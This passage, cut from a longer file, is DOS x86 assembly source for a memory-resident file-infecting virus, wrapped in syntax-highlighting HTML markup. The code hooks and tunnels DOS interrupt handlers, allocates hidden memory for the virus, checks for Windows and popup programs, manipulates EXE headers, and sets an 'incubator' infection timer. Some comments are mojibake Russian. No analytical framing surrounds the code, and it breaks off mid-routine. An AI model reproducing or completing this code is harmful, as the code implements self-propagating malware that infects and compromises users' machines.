    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc0"> </span><span class="sc1">;high UMB use</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5801h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">all_memory_size_p</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NC</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc1">;        mov     bx, cs</span><span class="sc0">
</span><span class="sc1">;        cmp     ax, bx</span><span class="sc0">
</span><span class="sc1">;        DOIF B</span><span class="sc0">
</span><span class="sc1">;             mov     es:[di.arena_owner], di</span><span class="sc0">
</span><span class="sc1">;        DOELSE</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">di.arena_owner</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">offset25</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">virus_move</span><span class="sc0">
</span><span class="sc1">;        DONE</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5801h</span><span class="sc0"> </span><span class="sc1">;restore</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5803h</span><span class="sc0"> </span><span class="sc1">;restore</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DosCall</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">save_seek</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Dostell</span><span class="sc0"> </span><span class="sc1">;dx:ax - cur pos</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">saved_seek.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc5">saved_seek.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;save_seek endp</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">restore_header</span><span class="sc0">  </span><span class="sc1">;dx:ax - original size</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_seek</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_exe_header</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosSeek</span><span class="sc0">        </span><span class="sc1">;seek</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;[exehdr.exe_len_mod_512]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosRead</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr.exe_len_mod_512</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">restore_seek</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">saved_seek.lo</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">saved_seek.hi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">dosseek</span><span class="sc0">
</span><span class="sc1">;restore_seek endp</span><span class="sc0">
</span><span class="sc1">;restore_header endp</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">p1</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">save_sp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calculate_crc</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">tunnel_detect</span><span class="sc0">
    </span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__retn</span><span class="sc0">
</span><span class="sc5">tunnel_detect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;íâ® ¢ë¯®«­ï¥âáï â®«ìª® ¯à¨ ¯¥à¢®© ãáâ ­®¢ª¥ ¢¨àãá  ¢ ¯ ¬ïâì</span><span class="sc0">

        </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11d</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">continue21</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opJMPFAR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">  </span><span class="sc1">;â¥áâ ­  ä®àâ®çª¨</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1600h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__retn</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3305h</span><span class="sc0">      </span><span class="sc1">;if BOOT-drive A: or B:</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">__retn</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">   </span><span class="sc1">;DS:SI - end of tunnel, (so21+TUNNELSIZE)</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;test for popup program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">08h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">11h</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">11h</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc5">PASS</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[(</span><span class="sc2">28h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">)+(</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">11h</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
</span><span class="sc5">no_stay_resident</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">__retn</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">;get DTA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">;set DTA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_own_name</span><span class="sc0"> </span><span class="sc1">;ds:dx -curname</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">;find first</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">;set DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">     </span><span class="sc1">;get system date</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.find_buf_date</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc1">;week only</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_stay_resident</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;es- current PSP</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc1">;ds- current MCB</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">arena_size</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;ds- size of current block</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">all_memory_size_p</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; increate current block size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">all_memory_size_p</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">      </span><span class="sc1">; allocate memory for virus</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_stay_resident</span><span class="sc0"> </span><span class="sc1">;cannot allocate memory for virus</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">PDB_block_len</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">all_memory_size_p</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">      </span><span class="sc1">;o21</span><span class="sc0">
</span><span class="sc1">;so21 -&gt; es:di ;si=o21+0Ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">11d</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;[si-TUNNELSIZE]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;ax - future virii segment</span><span class="sc0">
</span><span class="sc1">;get so25 (ds:si)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">][</span><span class="sc2">25h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">][-</span><span class="sc2">88h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;so25 -&gt; cs:[offset25]</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset25.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">    </span><span class="sc1">;ds:si  = so25</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">offset25.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;store (2Eh, 0FFh, 1Eh, o21+7, 0C7h, 6, o25, s25) -&gt; [so21]</span><span class="sc0">
</span><span class="sc1">;write TUNNEL</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0">        </span><span class="sc2">2Eh</span><span class="sc0">
        </span><span class="sc5">sto_two_byte</span><span class="sc0">    </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">             </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc4">[</span><span class="sc5">hook</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc5">sto_two_byte</span><span class="sc0">    </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc5">sto_word_</span><span class="sc0">       </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc1">;o25</span><span class="sc0">
        </span><span class="sc5">sto_word_</span><span class="sc0">       </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc1">;s25</span><span class="sc0">
</span><span class="sc1">;move5 [so25] -&gt; ss:(cs:)five_bytes</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._five_bytes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc5">movs5</span><span class="sc0">
</span><span class="sc1">;store (0EAh, memory_virentry, AX) -&gt; [so25]</span><span class="sc0">
        </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">  </span><span class="sc1">;s25</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">sto_byte</span><span class="sc0"> </span><span class="sc5">opJMPFAR</span><span class="sc0">
        </span><span class="sc5">sto_word_</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">memory_virentry</span><span class="sc4">&gt;</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;ax - future virii segment</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;es - future virii segment</span><span class="sc0">
</span><span class="sc1">;----move virus to new location------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;----setup incubator-----------------------------------------------------+-</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_cur_time</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INCUB_TIME</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_infect_time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">virus_move</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
